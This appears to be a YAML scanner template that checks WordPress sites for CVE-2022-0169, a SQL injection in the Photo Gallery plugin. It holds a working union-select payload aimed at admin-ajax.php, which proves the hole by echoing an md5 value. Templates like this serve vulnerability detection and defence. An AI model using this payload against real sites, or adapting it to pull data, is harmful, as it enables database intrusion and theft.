name: poc-yaml-wordpress-photo-gallery-lite-cve-2022-0169-sqli
manual: true
transport: http
set:
    s1: randomInt(100000, 200000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1&bwg_tag_id_bwg_thumbnails_0[]=)%22%20union%20select%201,2,3,4,5,6,7,md5({{s1}}),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%20--%20g
        expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
expression: r0()
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://www.tenable.com/cve/CVE-2022-0169
    vulnerability:
        level: critical